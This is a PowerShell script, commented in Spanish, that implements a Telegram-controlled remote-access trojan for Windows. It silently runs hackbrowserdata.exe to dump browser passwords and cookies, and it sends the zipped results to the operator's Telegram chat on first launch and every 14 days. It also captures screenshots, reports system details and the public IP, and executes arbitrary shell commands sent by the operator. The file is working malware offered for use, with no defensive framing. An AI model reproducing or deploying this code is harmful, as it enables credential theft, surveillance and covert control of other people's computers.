param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

# === CONFIGURACION ===
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = "$env:APPDATA\CarpetaDos\bot.log"
$HackPath = "$env:APPDATA\CarpetaDos\hackbrowserdata.exe"
$StateFile = "$env:APPDATA\CarpetaDos\bot_state.json"

# Variables de sesion
$script:CurrentDir = $PWD.Path
$script:LastStealTime = $null
$script:ProcessedUpdates = @{}
$script:Lock = New-Object System.Object

# Crear directorio
New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

# === FUNCIONES BASICAS ===
function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    try { Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue } catch {}
    Write-Host $line
}

function Send-Message {
    param([string]$Text)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
        return $true
    } catch {
        Write-Log "Error mensaje: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param([string]$Path, [string]$Caption = "")
    try {
        if (-not (Test-Path $Path)) { return $false }
        
        # Usar curl.exe (nativo en Windows 10/11)
        $args = @(
            "-s", "-X", "POST",
            "https://api.telegram.org/bot$Token/sendDocument",
            "-F", "chat_id=$ChatId",
            "-F", "document=@$Path"
        )
        if ($Caption) { $args += "-F", "caption=$Caption" }
        
        $result = & curl.exe @args 2>&1 | ConvertFrom-Json
        if ($result.ok) {
            Write-Log "Archivo enviado: $(Split-Path $Path -Leaf)"
            return $true
        }
        return $false
    } catch {
        Write-Log "Error archivo: $($_.Exception.Message)"
        return $false
    }
}

# === INFO DEL SISTEMA ===
function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    try {
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
    } catch { $os = "Windows" }
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
}

# === SCREENSHOT ===
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        
        $path = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'HH:mm:ss')"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        Send-Message -Text "Error capturando: $($_.Exception.Message)"
        return $false
    }
}

# === STEAL BROWSER DATA ===
function Steal-Data {
    param([switch]$Auto = $false)
    
    if (-not (Test-Path $HackPath)) {
        if (-not $Auto) { Send-Message -Text "Error: hackbrowserdata.exe no encontrado" }
        return
    }
    
    if (-not $Auto) { Send-Message -Text "Extrayendo datos..." }
    Write-Log "Iniciando extraccion"
    
    # Guardar procesos existentes
    $existing = Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
    
    $outDir = "$env:TEMP\br_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    
    try {
        # Ejecutar
        $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
        $p.WaitForExit(120000)
        if (-not $p.HasExited) { $p.Kill() }
        
        # Cerrar navegadores nuevos
        Start-Sleep -Seconds 2
        Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
            try { $_.Kill() } catch {}
        }
        
        # Enviar archivos
        $files = Get-ChildItem $outDir -Filter "*.json" -Recurse
        if ($files) {
            if (-not $Auto) { Send-Message -Text "Enviando $($files.Count) archivos..." }
            $sent = 0
            foreach ($f in $files) {
                $zip = "$env:TEMP\$($f.BaseName).zip"
                Compress-Archive -Path $f.FullName -DestinationPath $zip -Force
                if (Send-File -Path $zip -Caption $f.BaseName) { $sent++ }
                Remove-Item $zip -Force -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 1
            }
            if (-not $Auto) { Send-Message -Text "Completado: $sent/$($files.Count)" }
            Write-Log "Enviados $sent archivos"
        }
        
        $script:LastStealTime = Get-Date
        Save-State
        
    } finally {
        if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

# === EJECUTAR COMANDO CON SESION PERSISTENTE ===
function Run-Command {
    param([string]$Cmd)
    
    Write-Log "Ejecutando: $Cmd (en: $script:CurrentDir)"
    
    try {
        # Ejecutar en el directorio actual de sesion
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c $Cmd && cd"
        $psi.WorkingDirectory = $script:CurrentDir
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit()
        
        # Si el comando fue 'cd', actualizar directorio
        if ($Cmd -match '^cd\s+(.+)$') {
            $newPath = $Matches[1]
            $testPath = if ([System.IO.Path]::IsPathRooted($newPath)) { $newPath } else { Join-Path $script:CurrentDir $newPath }
            $resolved = Resolve-Path $testPath -ErrorAction SilentlyContinue
            if ($resolved) {
                $script:CurrentDir = $resolved.Path
                Send-Message -Text "Directorio: $script:CurrentDir"
                return
            }
        }
        
        # Enviar salida
        $output = $stdout + $stderr
        if ([string]::IsNullOrWhiteSpace($output)) { $output = "(sin salida)" }
        
        $temp = "$env:TEMP\cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        "Comando: $Cmd`nDir: $script:CurrentDir`n$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output" | Out-File $temp -Encoding UTF8
        
        Send-File -Path $temp -Caption "Salida: $Cmd"
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
        
    } catch {
        Send-Message -Text "Error: $($_.Exception.Message)"
    }
}

# === ESTADO Y AUTOMATIZACION ===
function Save-State {
    $state = @{
        LastStealTime = if ($script:LastStealTime) { $script:LastStealTime.ToString("o") } else { $null }
    }
    $state | ConvertTo-Json | Out-File $StateFile -Encoding UTF8
}

function Load-State {
    if (Test-Path $StateFile) {
        try {
            $state = Get-Content $StateFile | ConvertFrom-Json
            if ($state.LastStealTime) {
                $script:LastStealTime = [DateTime]::Parse($state.LastStealTime)
            }
        } catch {}
    }
}

function Check-AutoSteal {
    $now = Get-Date
    if (-not $script:LastStealTime) {
        Write-Log "Primera ejecucion - extrayendo datos..."
        Steal-Data -Auto
    } elseif (($now - $script:LastStealTime).Days -ge 14) {
        Write-Log "Han pasado 14 dias - extrayendo datos..."
        Steal-Data -Auto
    }
}

# === PROCESAR COMANDOS ===
function Process-Cmd {
    param([string]$Text, [int]$UpdateId)
    
    # Evitar duplicados
    [void][System.Threading.Monitor]::Enter($script:Lock)
    try {
        if ($script:ProcessedUpdates.ContainsKey($UpdateId)) { return }
        $script:ProcessedUpdates[$UpdateId] = $true
        
        # Limpiar entradas antiguas (mantener ultimas 100)
        if ($script:ProcessedUpdates.Count -gt 100) {
            $keys = $script:ProcessedUpdates.Keys | Sort-Object | Select-Object -First 50
            foreach ($k in $keys) { $script:ProcessedUpdates.Remove($k) }
        }
    } finally {
        [System.Threading.Monitor]::Exit($script:Lock)
    }
    
    Write-Log "Procesando: $Text"
    $parts = $Text.Trim() -split '\s+', 2
    $cmd = $parts[0].ToLower()
    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
    
    switch ($cmd) {
        "/help" {
            Send-Message -Text @"
Comandos:
/help - Ayuda
/info - Info del sistema
/ls - Listar archivos
/cd <ruta> - Cambiar directorio
/pwd - Directorio actual
/cmd <comando> - Ejecutar comando
/captura - Screenshot
/steal - Extraer datos navegadores
"@
        }
        
        "/info" { Send-Message -Text (Get-Info) }
        
        "/ls" {
            try {
                $items = Get-ChildItem $script:CurrentDir | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $script:CurrentDir`n`n$items"
            } catch {
                Send-Message -Text "Error: $($_.Exception.Message)"
            }
        }
        
        "/pwd" { Send-Message -Text "Directorio: $script:CurrentDir" }
        
        "/cd" {
            if ($args) {
                Run-Command -Cmd "cd $args"
            } else {
                Send-Message -Text "Uso: /cd <ruta>"
            }
        }
        
        "/cmd" {
            if ($args) {
                Run-Command -Cmd $args
            } else {
                Send-Message -Text "Uso: /cmd <comando>"
            }
        }
        
        "/captura" {
            Send-Message -Text "Capturando..."
            Take-Screenshot | Out-Null
        }
        
        "/steal" { Steal-Data }
        
        default { Write-Log "Comando desconocido: $cmd" }
    }
}

# === INICIO ===
Write-Log "=== BOT INICIADO ==="

# Cargar estado
Load-State

# Enviar mensaje de inicio
Send-Message -Text "Bot online - $(Get-Info)"

# Verificar extraccion automatica
Check-AutoSteal

# Limpiar webhook
try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Start-Sleep -Seconds 2
} catch {}

# Bucle principal
$lastId = 0
while ($true) {
    try {
        $resp = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId+1)&limit=1" -TimeoutSec 60
        
        if ($resp.ok -and $resp.result.Count -gt 0) {
            $upd = $resp.result[0]
            $lastId = $upd.update_id
            
            if ($upd.message -and $upd.message.text -and ([string]$upd.message.chat.id -eq $ChatId)) {
                Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id
            }
        }
        
        # Verificar si toca extraccion automatica (cada hora)
        if ((Get-Date).Minute -eq 0) {
            Check-AutoSteal
        }
        
    } catch {
        $err = $_.Exception.Message
        if ($err -notlike "*409*") {
            Write-Log "Error: $err"
        }
        Start-Sleep -Seconds 2
    }
    
    Start-Sleep -Milliseconds 1500
}
